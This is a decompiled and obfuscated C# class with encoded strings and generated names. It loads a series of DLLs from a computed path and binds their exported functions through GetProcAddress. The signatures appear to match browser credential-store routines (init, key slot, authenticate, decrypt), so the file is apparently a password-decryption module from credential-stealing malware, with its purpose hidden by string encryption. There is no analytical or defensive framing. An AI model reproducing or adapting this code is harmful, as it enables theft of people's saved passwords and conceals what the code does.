using System;
using System.Runtime.InteropServices;
using System.Text;

internal class Class16
{
	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate long Delegate9(string string_0);

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate long Delegate10();

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate long Delegate11(long long_0, bool bool_0, long long_1);

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate int Delegate12(IntPtr intptr_0, IntPtr intptr_1, StringBuilder stringBuilder_0, int int_0);

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate int Delegate13(ref Struct1 struct1_0, ref Struct1 struct1_1, int int_0);

	public class Class17
	{
		public static byte[] byte_0;

		public static long long_0;
	}

	public struct Struct1
	{
		public int int_0;

		public int int_1;

		public int int_2;
	}

	private static IntPtr intptr_0;

	public static string string_0;

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr GetProcAddress(IntPtr intptr_1, string string_1);

	[DllImport("kernel32", SetLastError = true)]
	private static extern IntPtr LoadLibrary(string string_1);

	public static long smethod_0(string string_1)
	{
		string text = Class12.smethod_15() + _003CModule_003E.smethod_0("⑰②⑃\u2456⑅⑀⑀\u244d␌⑪⑅\u245e⑉⑊⑃\u2454⑰", 140332);
		LoadLibrary(text + _003CModule_003E.smethod_0("뿒뿐뿅뿜뿍뿋뾎뾆뾑뿛뿓뿓", 966591));
		LoadLibrary(text + _003CModule_003E.smethod_0("ᕢᕿᕼᕾᔸᔢᕨᕠᕠ", 595212));
		LoadLibrary(text + _003CModule_003E.smethod_0("뮽뮡뮮믹믣뮩뮡뮡", 834509));
		LoadLibrary(text + _003CModule_003E.smethod_0("좹좥좭좺죽죧좭좥좥", 51401));
		LoadLibrary(text + _003CModule_003E.smethod_0("ŔŔŒœŎŋĔĉŃŋŋ", 917799));
		LoadLibrary(text + _003CModule_003E.smethod_0("턬턮턻턲터턭턨턵턤텲텯턥턭턭", 905537));
		LoadLibrary(text + _003CModule_003E.smethod_0("ม\u0e3c\u0e3c\u0e3a\u0e3bฦร\u0e7c\u0e61หรร", 921167));
		LoadLibrary(text + _003CModule_003E.smethod_0("\u0acb\u0ad7\u0ade\u0acc\u0ad7\u0ad3\u0ad6ઋખ\u0adc\u0ad4\u0ad4", 133816));
		intptr_0 = LoadLibrary(text + _003CModule_003E.smethod_0("宪宷宷寷寪宠宨宨", 809924));
		Delegate9 @delegate = (Delegate9)Marshal.GetDelegateForFunctionPointer(GetProcAddress(intptr_0, _003CModule_003E.smethod_0("썽썠썠썬썺썝썚썇", 377651)), typeof(Delegate9));
		return @delegate(string_1);
	}

	public static int smethod_1(IntPtr intptr_1, IntPtr intptr_2, StringBuilder stringBuilder_0, int int_0)
	{
		Delegate12 @delegate = (Delegate12)Marshal.GetDelegateForFunctionPointer(GetProcAddress(intptr_0, _003CModule_003E.smethod_0("␠\u243d\u243d\u242c␏␝␋\u2458\u245a\u2431\u242a␋␍␁␊␋\u242c␛␈␈␋␜", 730222)), typeof(Delegate12));
		return @delegate(intptr_1, intptr_2, stringBuilder_0, int_0);
	}

	public static long smethod_2(long long_0, bool bool_0, long long_1)
	{
		Delegate11 @delegate = (Delegate11)Marshal.GetDelegateForFunctionPointer(GetProcAddress(intptr_0, _003CModule_003E.smethod_0("鸨鸳鹉鹉鸧鸹鸍鸌鸐鸝鸖鸌鸑鸛鸙鸌鸝", 761464)), typeof(Delegate11));
		return @delegate(long_0, bool_0, long_1);
	}

	public static long smethod_3()
	{
		Delegate10 @delegate = (Delegate10)Marshal.GetDelegateForFunctionPointer(GetProcAddress(intptr_0, _003CModule_003E.smethod_0("\ue73d\ue726\ue75c\ue75c\ue732\ue72a\ue708\ue719\ue724\ue703\ue719\ue708\ue71f\ue703\ue70c\ue701\ue726\ue708\ue714\ue73e\ue701\ue702\ue719", 59245)), typeof(Delegate10));
		return @delegate();
	}

	public static int smethod_4(ref Struct1 struct1_0, ref Struct1 struct1_1, int int_0)
	{
		Delegate13 @delegate = (Delegate13)Marshal.GetDelegateForFunctionPointer(GetProcAddress(intptr_0, _003CModule_003E.smethod_0("㱒㱉㰳㰳㱑㱆㱐㱝㱆㱧㱡㱰㱻㱲㱶", 15362)), typeof(Delegate13));
		return @delegate(ref struct1_0, ref struct1_1, int_0);
	}
}
